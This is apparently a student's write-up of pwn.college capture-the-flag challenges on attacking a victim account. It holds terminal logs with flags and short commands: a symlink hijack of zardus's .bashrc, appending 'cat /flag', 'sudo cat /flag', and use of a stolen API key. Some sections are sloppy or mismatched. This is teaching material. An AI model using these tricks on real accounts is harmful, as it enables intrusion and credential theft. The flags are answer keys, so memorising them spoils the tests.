# 1. Bashrc Backdoor
The challenge prompted me to edit the PATH variable. 

## My Solve
**Flag:** `pwn.college{YWfMLaE1IqUYi9Cv_eUShFwxGsn.0VMzEzNxwiN1kjNzEzW}`

```bash
hacker@shenanigans~bashrc-backdoor:~$ /challenge/victim
Username: zardus
Password: ***********
pwn.college{YWfMLaE1IqUYi9Cv_eUShFwxGsn.0VMzEzNxwiN1kjNzEzW}
zardus@shenanigans~bashrc-backdoor:~$ exit
logout
hacker@shenanigans~bashrc-backdoor:~$
```

## What I learned
I learned about the .bashrc script

## References
The problem statement was used as the reference
```
In this challenge, we'll pretend that you've broken into a victim user's machine! That user is named zardus, with a home directory of /home/zardus. You, as the hacker user, have write access to his .bashrc, and zardus has read-access to /flag. The victim is simulated by the script /challenge/victim, and you can launch this script at any time to observe the victim logging into the computer. Can you get the flag?
```

# 2. Sniffing Input
The challenge prompted me to simulate attack

## My Solve
**Flag:** `pwn.college{UabyyomfrmikRAiKbhZWpMnprVk.0VNzEzNxwiN1kjNzEzW}`

```bash
hacker@shenanigans~sniffing-input:~$ /challenge/victim
Username: zardus
Password: ********
zardus@shenanigans~sniffing-input:~$ flag_checker
Type the flag
*************************************************************pwn.college{UabyyomfrmikRAiKbhZWpMnprVk.0VNzEzNxwiN1kjNzEzW}
zardus@shenanigans~sniffing-input:~$ exit
logout
hacker@shenanigans~sniffing-input:~$
```

## What I learned
I learned how to edit bashrc.

## References
The problem statement was used as the reference
```
Your mission is to use your continued write access to Zardus's .bashrc to intercept this flag. Remember how you hijacked commands in the Pondering PATH module? Can you use that capability to hijack the flag_checker?
```

# 3. Overshared Directories
The challenge prompted me to edit bashrc.

## My Solve
**Flag:** `pwn.college{cKYf0HaKoO8wavoP19k_Thnt1OJ.0FM0EzNxwiN1kjNzEzW}`

```bash
hacker@shenanigans~overshared-directories:~$ mv tmp /home/zardus/.bashrc
hacker@shenanigans~overshared-directories:~$ /challenge/victim
Username: zardus
Password: *********
zardus@shenanigans~overshared-directories:~$ flag_checker
Type the flag
*************************************************************pwn.college{cKYf0HaKoO8wavoP19k_Thnt1OJ.0FM0EzNxwiN1kjNzEzW}
zardus@shenanigans~overshared-directories:~$ exit
logout
```

## What I learned
I learned how to work with bashrc.

## References
The problem statement was used as the reference
```
In this challenge, we added a win command somewhere in your $PATH, but it won't give you the flag. Instead, it's in the same directory as a flag file that we made readable by you! You must find win (with the which command), and cat the flag out of that directory!
```

# 4. Tricky Linking
A custom challenge

## My Solve
**Flag:** `pwn.college{YXcUQlr13nk7XUm0SvHOZOD6x7G.0VM0EzNxwiN1kjNzEzW}`

```bash
hacker@shenanigans~tricky-linking:~$ ln -sf /home/zardus/.bashrc /tmp/collab/evil-commands.txt
hacker@shenanigans~tricky-linking:~$ /challenge/victim
Username: zardus
Password: *********
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
hacker@shenanigans~tricky-linking:~$ /challenge/victim
Username: zardus
Password: *********
pwn.college{YXcUQlr13nk7XUm0SvHOZOD6x7G.0VM0EzNxwiN1kjNzEzW}
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
```

## What I learned
I applied my knowleadge thru solving this challenge

## References
The problem statement was used as the reference
```
Recall from the previous level that, having write access to /tmp/collab, the hacker user can replace that evil-commands.txt file. Also remember from Comprehending Commands that files can link to other files. What happens if hacker replaces evil-commands.txt with a symbolic link to some sensitive file that zardus can write to? Chaos and shenanigans!
```

# 5.  Sniffing Process Arguments
The challenge prompted me to get leaks using psaux

## My Solve
**Flag:** `pwn.college{0DkqfbjwlVgKywt_ac9VaadECmb.0FOzEzNxwiN1kjNzEzW}`

```bash
zardus@shenanigans~sniffing-process-arguments:/home/hacker$ sudo cat /flag
pwn.college{0DkqfbjwlVgKywt_ac9VaadECmb.0FOzEzNxwiN1kjNzEzW}
```

## What I learned
Learnt a bit about lookin at processes to see command leaks

## References
The problem statement was used as the reference
```
That's what this challenge explores. Zardus is using an automation script, passing his account password to it as an argument. Zardus is also allowed to use sudo (and, thus, to sudo cat /flag!). Steal the password, log in to Zardus' account (recall the su command from the Untangling Users module), and get that flag!
```

# 5.  Snooping on Configurations
The challenge prompted me to get API key 

## My Solve
**Flag:** `pwn.college{IMziCvrvvmBK_YQafNJnyRCXBZI.0lM0EzNxwiN1kjNzEzW}`

```bash
hacker@shenanigans~snooping-on-configurations:~$ flag_getter --key sk-71843507
Correct API key! Do you want me to print the flag (y/n)?
y
pwn.college{IMziCvrvvmBK_YQafNJnyRCXBZI.0lM0EzNxwiN1kjNzEzW}
```

## What I learned
Learnt about snooping data from bashrc

## References
The problem statement was used as the reference
```
Naturally, Zardus stores his key in .bashrc. Can you steal the key and get the flag?


```